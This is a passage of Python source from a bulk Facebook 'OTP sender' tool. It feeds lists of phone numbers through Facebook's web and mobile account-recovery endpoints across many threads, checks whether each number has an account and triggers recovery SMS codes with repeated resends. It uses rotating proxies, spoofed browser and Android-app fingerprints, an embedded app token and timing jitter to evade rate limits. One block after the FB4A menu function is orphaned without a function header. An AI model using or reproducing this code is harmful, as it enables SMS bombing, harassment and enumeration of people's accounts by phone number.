    if 'iPhone' in user_agent or 'iPad' in user_agent:
        user_agent, ua_name = random.choice(WINDOWS_CHROME_VERSIONS)
    ua_display = format_ua_label(user_agent) if not ua_name or ua_name == 'Unknown UA' else ua_name

    number = str(number).strip()
    clean_number = re.sub(r'[^0-9]', '', number)
    if not clean_number:
        notify('failed', 'Invalid phone number', RED)
        return False

    time.sleep(random.uniform(2.0, 6.0))
    lang_header, country_code, _ = get_locale_for_proxy(proxy_data, clean_number)
    actual_proxy_country = 'Direct'
    proxy_dict = None
    if proxy_data:
        if isinstance(proxy_data, dict):
            actual_proxy_country = proxy_data.get('country', 'Proxy')
            if 'original' in proxy_data:
                proxy_dict = parse_proxy(proxy_data['original'])
            elif 'proxy' in proxy_data:
                proxy_dict = proxy_data['proxy']
            else:
                proxy_dict = proxy_data
        else:
            proxy_dict = parse_proxy(str(proxy_data))

    tls_target = get_impersonate_target(user_agent)
    if proxy_dict:
        safe_print(f'{GREEN} 🌐 PROXY [{actual_proxy_country}] [{number}] | UA: {ua_display} | TLS: {tls_target}{RESET}')
    else:
        safe_print(f'{CYAN} 🏠 REAL IP (Direct Connection) [{number}] | UA: {ua_display} | TLS: {tls_target}{RESET}')

    try:
        session = requests.Session(impersonate=tls_target)
        session.verify = False
        if proxy_dict:
            session.proxies.update(proxy_dict)

        init_h = {
            'user-agent': user_agent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': lang_header or 'en-US,en;q=0.9',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'upgrade-insecure-requests': '1'
        }
        r_init = session.get(
            'https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzk0NjUzMTQwfQ%3D%3D&ars=facebook_login',
            headers=init_h,
            allow_redirects=False,
            timeout=25
        )
        ci = ''
        loc = r_init.headers.get('location', '')
        m_ci = re.search(r'[?&]ci=([^&]+)', loc)
        if m_ci:
            ci = urllib.parse.unquote(m_ci.group(1))
        if not loc:
            loc = 'https://www.facebook.com/login/identify/?ctx=recover'
        elif loc.startswith('/'):
            loc = 'https://www.facebook.com' + loc

        r_page = session.get(loc, headers=init_h, timeout=25)
        page_html = r_page.text
        m_lsd = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}|name="lsd" value="([^"]+)"|"lsd":"([^"]+)"', page_html)
        lsd = ''
        if m_lsd:
            for g in m_lsd.groups():
                if g:
                    lsd = g
                    break
        if not lsd:
            notify('error', '[Web FB] Failed to get session LSD token', RED)
            return 'RETRY'

        m_hsi = re.search(r'"hsi":"(\d+)"', page_html)
        hsi = m_hsi.group(1) if m_hsi else '7707976571227258113'
        m_hs = re.search(r'"haste_session":"([^"]+)"', page_html)
        hs = m_hs.group(1) if m_hs else '20771.HYP:comet_loggedout_pkg.2.1...0'
        m_rev = re.search(r'"server_revision":(\d+)', page_html)
        rev = m_rev.group(1) if m_rev else '1054623785'
        jazoest = calc_jazoest(lsd)
        waterfall_id = str(uuid.uuid4())
        event_req_id = str(uuid.uuid4())
        dyn_token = '7xe6E5q5U5ObwKBAg5S1Dxu13w8CewSwMwNw9G2S0im3y4o0B-q1ew6ywaq0B04o5-0Bo7O2l0Fwqo31w9O0H8-U2zxe2GewbS361qw8Xwn82Lw6OyES1Tw8W0Lo6-0Co1kU1bo8Xw8S0QU3yw'

        gql_headers = {
            'host': 'www.facebook.com',
            'user-agent': user_agent,
            'accept': '*/*',
            'accept-language': lang_header or 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.facebook.com',
            'referer': loc,
            'x-fb-friendly-name': 'CAAFBAccountSearchViewQuery',
            'x-fb-lsd': lsd,
            'sec-ch-ua': '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        safe_print(f'{CYAN} [Web FB] Searching Account for [{number}]...{RESET}')
        search_query = number
        search_post = {
            '__a': '1',
            '__user': '0',
            '__comet_req': '15',
            '__hs': hs,
            '__rev': rev,
            '__hsi': hsi,
            '__dyn': dyn_token,
            '__csr': '',
            'jazoest': jazoest,
            'lsd': lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'CAAFBAccountSearchViewQuery',
            'variables': json.dumps({
                'params': {
                    'cipher_text': ci,
                    'context': 'recover',
                    'event_request_id': event_req_id,
                    'friend_name': '',
                    'search_query': search_query,
                    'waterfall_id': waterfall_id
                }
            }),
            'server_timestamps': 'true',
            'doc_id': '29078541985133425'
        }
        r1 = session.post('https://www.facebook.com/api/graphql/', headers=gql_headers, data=search_post, timeout=25)
        text1 = r1.text
        if 'for (;;);' in text1:
            text1 = text1.split('for (;;);', 1)[1]
        j1 = json.loads(text1)
        search_res = j1.get('data', {}).get('caa_ar_fb_account_search', {})
        accounts = search_res.get('accounts', [])
        redirect_uri = search_res.get('redirect_uri', '')

        if not redirect_uri and not accounts and not number.startswith('+'):
            search_post['variables'] = json.dumps({
                'params': {
                    'cipher_text': ci,
                    'context': 'recover',
                    'event_request_id': str(uuid.uuid4()),
                    'friend_name': '',
                    'search_query': '+' + clean_number,
                    'waterfall_id': waterfall_id
                }
            })
            r1 = session.post('https://www.facebook.com/api/graphql/', headers=gql_headers, data=search_post, timeout=25)
            text1 = r1.text
            if 'for (;;);' in text1:
                text1 = text1.split('for (;;);', 1)[1]
            j1 = json.loads(text1)
            search_res = j1.get('data', {}).get('caa_ar_fb_account_search', {})
            accounts = search_res.get('accounts', [])
            redirect_uri = search_res.get('redirect_uri', '')

        if not redirect_uri and not accounts:
            notify('failed', '[Web FB] Account Not Found (Skipped)', YELLOW)
            return False
        if len(accounts) > 1 and not redirect_uri:
            notify('failed', '[Web FB] Multiple Accounts Linked (Skipped)', YELLOW)
            return False

        m_init_ci = re.search(r'ci=([^&]+)', redirect_uri)
        init_ci = urllib.parse.unquote(m_init_ci.group(1)) if m_init_ci else ci
        gql_headers['referer'] = 'https://www.facebook.com' + redirect_uri if redirect_uri.startswith('/') else redirect_uri
        gql_headers['x-fb-friendly-name'] = 'CAAFBARInitiateViewRootQuery'

        init_post = dict(search_post)
        init_post['fb_api_req_friendly_name'] = 'CAAFBARInitiateViewRootQuery'
        init_post['doc_id'] = '29837221349198119'
        init_post['variables'] = json.dumps({
            'params': {
                'cipher': init_ci,
                'login_ids': {'waterfall_id': waterfall_id},
                'waterfall_id': waterfall_id
            }
        })
        r2 = session.post('https://www.facebook.com/api/graphql/', headers=gql_headers, data=init_post, timeout=25)
        text2 = r2.text
        if 'for (;;);' in text2:
            text2 = text2.split('for (;;);', 1)[1]
        j2 = json.loads(text2)
        init_view = j2.get('data', {}).get('caa_ar_fb_initiate_view', {})
        send_cipher = init_view.get('cipher', '') if init_view else init_ci
        if not send_cipher:
            notify('failed', '[Web FB] Recovery Options Unavailable (Skipped)', YELLOW)
            return False

        safe_print(f'{CYAN} [Web FB] Triggering SMS OTP for [{number}]...{RESET}')
        gql_headers['x-fb-friendly-name'] = 'useCAASendRecoveryCodeMutation'
        send_post = dict(search_post)
        send_post['fb_api_req_friendly_name'] = 'useCAASendRecoveryCodeMutation'
        send_post['doc_id'] = '25714184854871712'
        send_post['variables'] = json.dumps({
            'input': {
                'actor_id': '0',
                'client_mutation_id': '1',
                'access_flow_version': 'pre_mt_behavior',
                'cipher': send_cipher,
                'event_request_id': str(uuid.uuid4()),
                'recover_method': 'send_sms:0',
                'waterfall_id': waterfall_id
            },
            'scale': 1
        })
        r3 = session.post('https://www.facebook.com/api/graphql/', headers=gql_headers, data=send_post, timeout=25)
        text3 = r3.text
        if 'for (;;);' in text3:
            text3 = text3.split('for (;;);', 1)[1]
        try:
            j3 = json.loads(text3)
            code_res = j3.get('data', {}).get('caa_ar_fb_send_confirmation_code', {})
            code_red_uri = code_res.get('redirect_uri', '') if code_res else ''
            error_msg = code_res.get('error_message') if code_res else None
        except Exception:
            code_red_uri = ''
            error_msg = 'parse_error'

        if '/recover/code/' in code_red_uri or (code_red_uri and not error_msg):
            notify('success', f'OTP Sent via Web Facebook CAA (SMS)! [UA: {ua_display}] [Proxy: {actual_proxy_country}]', GREEN)
            save_success_number(number)
            save_registered_number(number)
            m_code_ci = re.search(r'ci=([^&]+)', code_red_uri)
            code_ci = urllib.parse.unquote(m_code_ci.group(1)) if m_code_ci else send_cipher
            if resend_count > 0:
                for r_idx in range(1, resend_count + 1):
                    time.sleep(round(random.uniform(3.0, 5.0), 2))
                    try:
                        safe_print(f'{CYAN} [Web FB] Attempting Resend {r_idx}/{resend_count}... [{number}]{RESET}')
                        gql_headers['x-fb-friendly-name'] = 'useCAACodeResendMutation'
                        resend_post = dict(search_post)
                        resend_post['fb_api_req_friendly_name'] = 'useCAACodeResendMutation'
                        resend_post['doc_id'] = '26721695507419072'
                        resend_post['variables'] = json.dumps({
                            'input': {
                                'actor_id': '0',
                                'client_mutation_id': str(r_idx + 2),
                                'access_flow_version': 'pre_mt_behavior',
                                'cipher': code_ci,
                                'waterfall_id': waterfall_id
                            },
                            'scale': 1
                        })
                        r_re = session.post('https://www.facebook.com/api/graphql/', headers=gql_headers, data=resend_post, timeout=25)
                        t_re = r_re.text
                        if 'for (;;);' in t_re:
                            t_re = t_re.split('for (;;);', 1)[1]
                        j_re = json.loads(t_re)
                        if j_re.get('data', {}).get('caa_ar_code_entry_resend', {}).get('resend_success'):
                            safe_print(f'{GREEN} {number} Web FB OTP Resend {r_idx}/{resend_count} Successful! [{actual_proxy_country}]{RESET}')
                        else:
                            safe_print(f'{YELLOW} {number} Web FB Resend {r_idx}/{resend_count} rate-limited or error [{actual_proxy_country}]{RESET}')
                    except Exception as e_resend:
                        safe_print(f'{YELLOW} {number} Web FB Resend error: {e_resend} [{actual_proxy_country}]{RESET}')
            return True
        if error_msg:
            notify('failed', f'[Web FB] {error_msg} (Skipped)', YELLOW)
        else:
            notify('failed', '[Web FB] Failed to trigger SMS OTP', YELLOW)
        return False
    except Exception as e:
        safe_print(f'{RED} [Web FB] Error for [{number}]: {e}{RESET}')
        return 'RETRY'


def web_facebook_otp_menu():
    clear_logo()
    print(f'\n{GREEN} ✦✦✦ WEB FACEBOOK AUTO OTP SENDER (GraphQL) ✦✦✦{RESET}\n')
    numbers = file_input('web_facebook_settings')
    if not numbers:
        input(f'{WHITE} Press Enter to exit...')
        return
    ua_func = setup_user_agent('web_facebook_settings')
    PROXY_LIST, PROXY_ITERATOR = setup_proxies('web_facebook_settings')
    setup_language('web_facebook_settings')
    resend_count = setup_otp_resend('web_facebook_settings')
    max_workers = setup_threads('web_facebook_settings')
    import concurrent.futures
    clear_logo()
    reset_counters()
    original_numbers = list(numbers)
    set_total_numbers(len(original_numbers))
    print(f'{GREEN} [{RED}◆{GREEN}] Engine          {EKL} www.facebook.com (Comet CAA GraphQL)')
    print(f'{GREEN} [{RED}◆{GREEN}] Total Numbers  {EKL} {len(original_numbers)}')
    print(f'{GREEN} [{RED}◆{GREEN}] Threads         {EKL} {max_workers}')
    print(f"{GREEN} [{RED}◆{GREEN}] Proxies         {EKL} {len(PROXY_LIST) if PROXY_LIST else 'None'}")
    print(LINE)
    executor = ThreadPoolExecutor(max_workers=max_workers)
    remaining_numbers = list(original_numbers)
    retry_counts = {num: 0 for num in original_numbers}
    future_to_num = {}
    for num in original_numbers:
        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
        user_agent = ua_func()
        future = executor.submit(process_web_facebook_number, num, user_agent, proxy_data, resend_count)
        future_to_num[future] = num
    try:
        while future_to_num:
            done, _ = concurrent.futures.wait(future_to_num.keys(), return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                n = future_to_num.pop(future)
                try:
                    res = future.result()
                except Exception:
                    res = None
                if res == 'RETRY':
                    attempts = retry_counts.get(n, 0)
                    if attempts < 2:
                        retry_counts[n] = attempts + 1
                        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
                        user_agent = ua_func()
                        new_f = executor.submit(process_web_facebook_number, n, user_agent, proxy_data, resend_count)
                        future_to_num[new_f] = n
                        continue
                with file_lock:
                    if n in remaining_numbers:
                        remaining_numbers.remove(n)
                save_remaining_numbers(remaining_numbers)
    finally:
        executor.shutdown(wait=True)
    display_final_summary(continuous_mode=False)
    input(f'\n{WHITE} Press Enter to return to main menu...')


def process_fb_app_number(number, user_agent_data, proxy_data=None, resend_count=1):
    import re
    import time
    import random
    import json
    import uuid
    from curl_cffi import requests as cffi_requests

    if isinstance(user_agent_data, tuple):
        user_agent, ua_display = user_agent_data[0], user_agent_data[1] or format_ua_label(user_agent_data[0])
    else:
        user_agent = user_agent_data
        ua_display = format_ua_label(user_agent)

    number = str(number).strip()
    clean_number = re.sub(r'[^0-9]', '', number)
    if not number.startswith('+'):
        number = '+' + clean_number
    raw_number = number.lstrip('+')

    time.sleep(random.uniform(2.0, 7.0))
    lang_header, country_code, _ = get_locale_for_proxy(proxy_data, raw_number)
    fb_locale = auto_fb_locale(country_code)
    client_country = country_code or 'US'
    actual_proxy_country = 'Direct'
    proxy_dict = None
    if proxy_data:
        if isinstance(proxy_data, dict):
            actual_proxy_country = proxy_data.get('country', 'Proxy')
            if 'original' in proxy_data:
                proxy_dict = parse_proxy(proxy_data['original'])
            elif 'proxy' in proxy_data:
                proxy_dict = proxy_data['proxy']
            else:
                proxy_dict = proxy_data
        elif isinstance(proxy_data, str):
            proxy_dict = parse_proxy(proxy_data)
            actual_proxy_country = 'Proxy'

    FB4A_ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    FB4A_VERSION = '510.0.0.72.41'
    FB4A_BUILD = '725719263'
    FB4A_REV = '1053579369'
    fb4a_devices = [
        ('SCG01', 'samsung', 'samsung', '13'),
        ('SM-S928B', 'samsung', 'samsung', '14'),
        ('SM-S918B', 'samsung', 'samsung', '14'),
        ('SM-G998B', 'samsung', 'samsung', '13'),
        ('Pixel 8 Pro', 'google', 'Google', '14'),
        ('Pixel 9', 'google', 'Google', '15'),
        ('SM-A546B', 'samsung', 'samsung', '14')
    ]
    dev_model, dev_brand, dev_mfr, dev_sv = random.choice(fb4a_devices)
    fb4a_carrier = auto_carrier(country_code) or 'T-Mobile'
    fb4a_ua = (
        f'[FBAN/FB4A;FBAV/510.0.0.72.41;FBBV/725719263;'
        f'FBDM={{density=2.75,width=1080,height=2340}};FBLC/{fb_locale};'
        f'FBRV/0;FBCR/{fb4a_carrier};FBMF/{dev_mfr};FBBD/{dev_brand};'
        f'FBPN/com.facebook.katana;FBDV/{dev_model};FBSV/{dev_sv};'
        f'FBOP/1;FBCA/arm64-v8a:;]'
    )
    device_id = str(uuid.uuid4())
    waterfall_id = str(uuid.uuid4())
    if proxy_dict:
        safe_print(f'{GREEN} 🌐 FB4A [{actual_proxy_country}] [{number}] UA:{dev_model}{RESET}')
    else:
        safe_print(f'{CYAN} 🏠 FB4A DIRECT [{number}] UA:{dev_model}{RESET}')

    session = cffi_requests.Session(impersonate=_valid_impersonate('chrome131_android', android=True))
    session.verify = False
    if proxy_dict:
        session.proxies.update(proxy_dict)

    base_h = {
        'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'user-agent': fb4a_ua,
        'x-fb-sim-hni': '47003',
        'x-fb-net-hni': '47003',
        'x-fb-connection-type': 'WIFI',
        'x-fb-connection-quality': 'EXCELLENT',
        'x-zero-state': 'unknown',
        'x-fb-http-engine': 'Tigon/Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True',
        'x-fb-device-group': '1678',
        'app-scope-id-header': device_id,
        'accept-encoding': 'gzip, deflate',
        'x-tigon-is-retry': 'False',
        'priority': 'u=3, i'
    }
    try:
        safe_print(f'{CYAN} [FB4A] Step 1: Searching [{number}]...{RESET}')
        search_params_json = json.dumps({
            'server_params': {
                'event_request_id': str(uuid.uuid4()),
                'INTERNAL__latency_qpl_marker_id': 36707139,
                'INTERNAL__latency_qpl_instance_id': int(time.time() * 100000),
                'device_id': device_id,
                'family_device_id': device_id,
                'waterfall_id': waterfall_id,
                'offline_experiment_group': None,
                'layered_homepage_experiment_group': None,
                'is_platform_login': 0,
                'is_from_logged_in_switcher': 0,
                'is_from_logged_out': 0,
                'access_flow_version': 'pre_mt_behavior',
                'login_surface': 'login_home',
                'login_entry_point': 'logged_out',
                'context_data': ''
            },
            'client_input_params': {
                'zero_balance_state': '',
                'search_query': number,
                'fetched_email_list': [],
                'fetched_email_token_list': [],
                'sso_accounts_auth_data': [],
                'sfdid': '',
                'text_input_id': 'jlzd35:93',
                'encrypted_msisdn': '',
                'headers_infra_flow_id': '',
                'was_headers_prefill_available': 0,
                'was_headers_prefill_used': 0,
                'ig_oauth_token': [],
                'android_build_type': '',
                'is_whatsapp_installed': 0,
                'device_network_info': '',
                'accounts_list': [],
                'is_oauth_without_permission': 0,
                'search_screen_type': 'mobile',
                'ig_vetted_device_nonce': '',
                'gms_incoming_call_retriever_eligibility': 'client_not_supported',
                'auth_secure_device_id': '',
                'blocked_uids': [],
                'cloud_trust_token': None,
                'network_bssid': None,
                'lois_settings': {'lois_token': ''},
                'aac': ''
            }
        })
        mfb_locale = _FB_LOCALE_MAP.get(country_code, 'en_US') if country_code else 'en_US'
        session.cookies.set('locale', mfb_locale, domain='.facebook.com')
        mfb_headers_get = {
            'user-agent': user_agent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': lang_header or 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate',
            'upgrade-insecure-requests': '1'
        }
        r_init = session.get(f'https://m.facebook.com/login/identify/?ctx=recover&locale={mfb_locale}', headers=mfb_headers_get, timeout=20)
        init_html = r_init.text

        def _ex(patterns, text, default=''):
            for p in patterns:
                m = re.search(p, text)
                if m:
                    for g in m.groups():
                        if g:
                            return g
            return default

        lsd = _ex([r'"LSD",\[\],\{"token":"([^"]+)"\}', r'"lsd":"([^"]+)"', r'name="lsd" value="([^"]+)"'], init_html)
        fb_dtsg = _ex([r'name="fb_dtsg" value="([^"]+)"', r'"DTSGInitialData",\[\],\{"token":"([^"]+)"\}', r'"fb_dtsg"\s*:\s*"([^"]+)"'], init_html)
        rev = _ex([r'"server_revision":(\d+)', r'"__rev"\s*:\s*(\d+)'], init_html, '1053579369')
        hsi = _ex([r'"hsi":"(\d+)"', r'"__hsi"\s*:\s*"(\d+)"'], init_html, '7707864257778152385')
        hs = _ex([r'"haste_session":"([^"]+)"', r'"__hs":"([^"]+)"'], init_html, '20771.BP:wbloks_caa_pkg.2.0...0')
        bkv = _ex([r'versioning_id:"([a-f0-9]{64})"', r'"__bkv"\s*:\s*"([a-f0-9]{40,})"'], init_html, 'd717f36782962c65b9813c179e0b91cb7e84ee7ef2ad437682efaddaa3ffe61d')
        cd_matches = re.findall(r'[\w\-]{50,}\|arm', init_html)
        cd = cd_matches[0] if cd_matches else ''
        datr = session.cookies.get_dict().get('datr', '')
        if not lsd or not cd:
            update_counter('error', number, '[FB4A] Failed to get session tokens', RED)
            return 'RETRY'

        jazoest = calc_jazoest(fb_dtsg or lsd)
        mfb_post_h = {
            'user-agent': user_agent,
            'accept': '*/*',
            'accept-language': lang_header or 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://m.facebook.com',
            'referer': f'https://m.facebook.com/login/identify/?ctx=recover&locale={mfb_locale}',
            'accept-encoding': 'gzip, deflate',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        d_base = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '9',
            '__hs': hs,
            'dpr': '3',
            '__ccg': 'EXCELLENT',
            '__rev': rev,
            '__s': generate_s_val(),
            '__hsi': hsi,
            '__dyn': '7xeUmwlE6XwkEiB4K7oFomgwTxB35oz8h2pxi4Eywdo5u4o1mxy7m1uxuCFQ84K',
            'fb_dtsg': fb_dtsg,
            'jazoest': jazoest,
            'lsd': lsd
        }
        r1 = session.post(
            f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.search.async&type=action&__bkv={bkv}',
            headers=mfb_post_h,
            data={**d_base, 'params': search_params_json},
            timeout=25
        )
        if r1.status_code not in (200, 201):
            update_counter('error', number, f'[FB4A] Search HTTP {r1.status_code}', RED)
            return 'RETRY'

        r1_text = r1.text
        no_acc_sigs = ['find_your_account', 'search_error', 'no_results', 'account_not_found']
        multi_sigs = ['multiple_accounts', 'account_disambiguation', 'choose_account', 'choose your account']
        r1_lower = r1_text.lower()
        if any(s in r1_lower for s in no_acc_sigs):
            update_counter('noacc', number, '[FB4A] Account Not Found', YELLOW)
            return False
        if any(s in r1_lower for s in multi_sigs):
            update_counter('failed', number, '[FB4A] Multiple Accounts (Skipped)', YELLOW)
            return False

        arm_matches = re.findall(r'[\w\-]{50,}\|arm', r1_text)
        if not arm_matches:
            update_counter('failed', number, '[FB4A] No account found', YELLOW)
            return False

        context_data = arm_matches[-1]
        dyn_m = re.search(r'"__dyn"\s*:\s*"([^"]+)"', r1_text)
        if dyn_m:
            d_base['__dyn'] = dyn_m.group(1)

        safe_print(f'{GREEN} [FB4A] Account found! [{number}]{RESET}')
        safe_print(f'{CYAN} [FB4A] Step 2: Triggering SMS OTP [{number}]...{RESET}')
        otp_params = json.dumps({
            'client_input_params': {
                'auth_option': 'phone',
                'selected_phone_number_index': -1,
                'selected_xapp_contactpoint_index': -1,
                'selected_encrypted_bloks_xapp_cp_lookup_data': '',
                'family_device_id': '',
                'machine_id': '',
                'zero_balance_state': '',
                'android_build_type': '',
                'cloud_trust_token': None,
                'network_bssid': None,
                'lois_settings': {'lois_token': ''},
                'aac': ''
            },
            'server_params': {
                'device_id': device_id,
                'event_request_id': str(uuid.uuid4()),
                'sms_source_component': 'xhp_bk__caa__ar__initiate_view',
                'sms_source_button': 'PRIMARY_BUTTON',
                'sms_source_trigger': 'click',
                'login_type': 'FB_SSO',
                'auth_options': ['phone', 'password', 'whatsapp'],
                'lara_usage': 0,
                'INTERNAL__latency_qpl_marker_id': 36707139,
                'INTERNAL__latency_qpl_instance_id': int(time.time() * 100000),
                'family_device_id': device_id,
                'waterfall_id': waterfall_id,
                'offline_experiment_group': None,
                'is_platform_login': 0,
                'is_from_logged_in_switcher': 0,
                'is_from_logged_out': 0,
                'access_flow_version': 'pre_mt_behavior',
                'login_surface': 'account_recovery',
                'login_entry_point': 'account_recovery',
                'context_data': context_data,
                'serialized_states': {'is_loading': '2;1ki7cfc3a7;0'}
            }
        })
        d_otp = {**d_base, '__req': 'n', 'params': otp_params}
        r2 = session.post(
            f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_option_selection.async&type=action&__bkv={bkv}',
            headers=mfb_post_h,
            data=d_otp,
            timeout=25
        )
        r2_text = r2.text
        r2_lower = r2_text.lower()
        rate_sigs = ['rate_limit', 'sms_drop', "we_can't_send", 'we cannot send', 'too many', '429']
        no_sms_sigs = ['phone_not_available', 'sms not available', 'no phone', 'whatsapp_only']
        success_sigs = ['code_entry', 'confirmation_code', 'otp_sent', 'code_send_success', 'sms_sent', 'verify_code', 'enter_code']
        if any(s in r2_lower for s in rate_sigs):
            update_counter('cap', number, f'[FB4A] Rate Limited / SMS Cooldown [{actual_proxy_country}]', YELLOW)
            return False
        if any(s in r2_lower for s in no_sms_sigs):
            update_counter('failed', number, '[FB4A] Phone SMS Not Available (Skipped)', YELLOW)
            return False
        if any(s in r2_lower for s in success_sigs) or r2.status_code in (200, 201):
            update_counter('success', number, f'[FB4A] OTP Sent! [Dev: {dev_model}] [Proxy: {actual_proxy_country}]', GREEN)
            save_registered_number(number)
            save_success_number(number)
            if resend_count > 0:
                for r_idx in range(1, resend_count + 1):
                    time.sleep(random.uniform(3.0, 5.5))
                    try:
                        r_resend = session.post(
                            f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_option_selection.async&type=action&__bkv={bkv}',
                            headers=mfb_post_h,
                            data={**d_base, '__req': to_base36(30 + r_idx), 'params': otp_params},
                            timeout=20
                        )
                        if r_resend.status_code in (200, 201):
                            safe_print(f'{GREEN} {number} [FB4A] Resend {r_idx}/{resend_count} OK [{actual_proxy_country}]{RESET}')
                        else:
                            safe_print(f'{YELLOW} {number} [FB4A] Resend {r_idx}/{resend_count} HTTP {r_resend.status_code} [{actual_proxy_country}]{RESET}')
                    except Exception as e_r:
                        safe_print(f'{YELLOW} {number} [FB4A] Resend error: {e_r} [{actual_proxy_country}]{RESET}')
            return True
        err_preview = r2_text[:80].replace('\n', ' ')
        update_counter('failed', number, f'[FB4A] OTP trigger failed: {err_preview}', RED)
        save_failed_number(number)
        return False
    except Exception as e:
        err_str = str(e).lower()
        if 'timeout' in err_str or 'timed out' in err_str:
            update_counter('error', number, f'[FB4A] Timeout [{actual_proxy_country}]', RED)
            save_failed_number(number)
            return 'RETRY'
        if 'proxy' in err_str or 'connect' in err_str:
            update_counter('error', number, f'[FB4A] Proxy error: {str(e)[:30]}', RED)
            save_failed_number(number)
            time.sleep(1)
            return 'RETRY'
        update_counter('error', number, f'[FB4A] Error: {str(e)[:40]}', RED)
        save_failed_number(number)
        return False
    finally:
        try:
            session.close()
        except Exception:
            pass


def fb_app_otp_menu():
    clear_logo()
    print(f'\n{GREEN} ✦✦✦ OFFICIAL FB APP OTP SENDER (FB4A) ✦✦✦{RESET}')
    print(f'{CYAN} Using: Facebook Android App v510 — b-graph.facebook.com GraphQL Bloks API{RESET}\n')
    numbers = file_input('api_settings')
    if not numbers:
        input(f'{WHITE} Press Enter to exit...')
        return
    clear_logo()
    print(f'{GREEN} [{RED}◆{GREEN}] FB4A UA Mode {EKL} Auto (Samsung Galaxy / Pixel - Android){RESET}')
    time.sleep(0.8)
    ua_func = lambda: get_modern_mobile()
    PROXY_LIST, PROXY_ITERATOR = setup_proxies('api_settings')
    setup_language('api_settings')
    resend_count = setup_otp_resend('api_settings')
    max_workers = setup_threads('api_settings')
    import concurrent.futures
    clear_logo()
    reset_counters()
    original_numbers = list(numbers)
    set_total_numbers(len(original_numbers))
    print(f'{GREEN} [{RED}◆{GREEN}] Service         {EKL} Official FB App (FB4A GraphQL Bloks)')
    print(f'{GREEN} [{RED}◆{GREEN}] Total Numbers  {EKL} {len(original_numbers)}')
    print(f'{GREEN} [{RED}◆{GREEN}] Threads         {EKL} {max_workers}')
    print(f"{GREEN} [{RED}◆{GREEN}] Proxies         {EKL} {len(PROXY_LIST) if PROXY_LIST else 'None'}")
    print(LINE)
    executor = ThreadPoolExecutor(max_workers=max_workers)
    remaining_numbers = list(original_numbers)
    retry_counts = {num: 0 for num in original_numbers}
    future_to_num = {}
    for num in original_numbers:
        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
        user_agent = ua_func()
        future = executor.submit(process_fb_app_number, num, user_agent, proxy_data, resend_count)
        future_to_num[future] = num
    try:
        while future_to_num:
            done, _ = concurrent.futures.wait(future_to_num.keys(), return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                n = future_to_num.pop(future)
                try:
                    res = future.result()
                except Exception:
                    res = None
                if res == 'RETRY':
                    attempts = retry_counts.get(n, 0)
                    if attempts < 2:
                        retry_counts[n] = attempts + 1
                        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
                        user_agent = ua_func()
                        new_f = executor.submit(process_fb_app_number, n, user_agent, proxy_data, resend_count)
                        future_to_num[new_f] = n
                        continue
                with file_lock:
                    if n in remaining_numbers:
                        remaining_numbers.remove(n)
                save_remaining_numbers(remaining_numbers)
    finally:
        executor.shutdown(wait=True)
    display_final_summary(continuous_mode=False)
    input(f'\n{WHITE} Press Enter to return to main menu...')

    import re
    clear_logo()
    proxy_file = get_proxy_file_path()
    print(f'\n{GREEN} === Change Proxy Country Code ==={RESET}')
    print(f'{YELLOW} (This will update all entries in {proxy_file}){RESET}\n')
    new_code = input(f'{GREEN} [{RED}◆{GREEN}] Enter new 2-letter country code (e.g. US, BD, GB): {EKL} ').strip()
    if len(new_code) == 2 and new_code.isalpha():
        file_path = proxy_file
        if not os.path.exists(file_path):
            print(f'\n{RED} Error: {file_path} not found.{RESET}')
            time.sleep(2)
            return
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        content = re.sub(r'_custom_zone_[a-zA-Z]{2}_st_', f'_custom_zone_{new_code.lower()}_st_', content)
        content = re.sub(r'-region-[a-zA-Z]{2}:', f'-region-{new_code.lower()}:', content)
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f'\n{GREEN} Success! Proxy country code changed to {new_code.upper()}{RESET}')
        time.sleep(2.5)
    else:
        print(f'\n{RED} Invalid input. Exactly 2 letters required.{RESET}')
        time.sleep(2.5)


def main_menu():
    while True:
        clear_logo()
        print(f' {opt_labels[0]} API Automation (Fast - Meta AI)')
        print(f' {opt_labels[1]} Mobile Web OTP (m.facebook Recovery)')
        print(f' {opt_labels[2]} Web Facebook OTP (www.facebook.com GraphQL)')
        print(f' {opt_labels[3]} Change Proxy Country')
        print(f' {opt_labels[4]} Muse OTP Sender')
        print(f' {opt_labels[5]} Exit')
        print(LINE)
